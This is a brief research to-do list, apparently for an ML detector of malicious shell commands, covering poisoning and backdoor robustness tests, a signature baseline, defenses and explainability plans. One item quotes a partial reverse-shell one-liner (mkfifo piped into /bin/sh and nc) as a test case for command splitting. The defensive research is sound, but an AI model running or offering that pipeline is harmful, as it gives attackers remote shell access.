# ToDo

1. Adversarial robustness tests:
   1. Poisoning:
      1. ~~pollution: ~~code~~ (`adversarial_poisoning_pollution.py`) | ~~run~~
      2. ~~backdoor (sparse region): ~~code~~ (`adversarial_poisoning_bacdoor.py`) | ~~run~~

         > NOTE: If results for some runs are anomalous -- delete files and rerun. This might be because some script runs blue-screen'ed my laptop, and best model from training was interrupted might actually be not optimal.

      3. ~~Extend experiments to XGBoost~~

   2. Signature baseline -- stay robust? Worth showing.
   3. Defend:
      1. ~~adversarial training (draw scheme)~~
      2. hybrid approach: ML + signatures?

2. Command splitting, e.g.: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc` to passing through ML model as separate commands?
   > Battista: "Used in Certification schemes." <-- ??

3. Explainability tests (???):
   1. Integrated gradients TODO
   2. Attention weights from transformer TODO
